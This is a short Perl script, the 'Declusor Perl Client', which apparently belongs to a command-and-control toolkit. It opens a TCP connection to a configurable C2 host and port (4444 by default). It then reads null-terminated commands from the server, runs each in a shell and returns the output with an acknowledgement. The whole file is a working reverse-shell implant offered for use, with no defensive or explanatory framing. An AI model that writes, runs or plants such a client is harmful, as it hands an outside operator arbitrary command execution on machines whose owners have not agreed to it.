#!/usr/bin/env perl
# -----------------------------------------------------------------------------
# Declusor Perl Client
# Connects to a C2 server, reads null-terminated commands, executes them,
# and returns the output.
# -----------------------------------------------------------------------------

use strict;
use warnings;
use IO::Socket::INET;

# Configuration
my $HOST = $ENV{'HOST'} || '127.0.0.1';
my $PORT = $ENV{'PORT'} || 4444;
my $ACKNOWLEDGE = $ENV{'ACKNOWLEDGE'} || 'ACK';

my $socket = IO::Socket::INET->new(
    PeerAddr => $HOST,
    PeerPort => $PORT,
    Proto    => 'tcp'
) or die "Cannot connect to server";

# Set input record separator to null byte
local $/ = "\0";

while (my $cmd = <$socket>) {
    chomp $cmd; # Remove the null byte
    
    if ($cmd ne "") {
        # Execute command and capture output (including stderr)
        my $output = `$cmd 2>&1`;
        
        # Send output
        print $socket $output if defined $output;
        
        # Send ACK
        print $socket $ACKNOWLEDGE;
    }
}

close $socket;
